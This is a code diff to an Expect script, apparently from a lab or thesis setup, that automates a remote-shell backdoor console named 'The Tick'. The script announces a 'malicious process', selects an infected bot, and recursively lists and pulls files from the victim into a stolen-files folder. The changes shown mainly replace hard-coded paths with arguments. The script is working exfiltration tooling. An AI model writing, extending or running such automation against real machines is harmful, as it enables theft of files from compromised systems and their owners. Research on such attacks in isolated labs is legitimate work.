@@ -3,6 +3,9 @@
 puts "\r** START MALICIOUS PROCESS **\r\r"
 
 set stolen_files_folder_location [lindex $argv 0]
+set tick_remote_shell_folder [lindex $argv 1]
+set client_config_folder [lindex $argv 2]
+
 
 # Activate the Conda environment within Expect
 spawn bash 
@@ -10,7 +13,7 @@ send "source ~/anaconda3/bin/activate py27\r"
 expect "$ "
 
 # start tick console
-send "python /home/patrik/BA/thetick/tick.py \r"
+send "python $tick_remote_shell_folder/tick.py \r"
 expect "$ "
 
 
@@ -27,7 +30,7 @@ expect {
     }
 }
 sleep 5
-
+set timeout 10
 
 # select bot 0 to work with
 send "\ruse 0\r"
@@ -36,6 +39,7 @@ expect -re {\[.*\]}
 
 # Procedure to list files and pull from a given absolute path
 proc traverse {dir stolen_files_folder} {
+    global client_config_folder
     puts "\r==> Scanning directory: $dir\r"
     
     # Run `exec ls -l <dir>`
@@ -99,7 +103,7 @@ proc traverse {dir stolen_files_folder} {
     
 	}    
     # check if fp is finished
-    send "exec cat /home/admin/BA/config/fp_done.flag\r"
+    send "exec cat $client_config_folder/fp_done.flag\r"
     set timeout 3
     expect {
 		-re {fp finished successfully} {
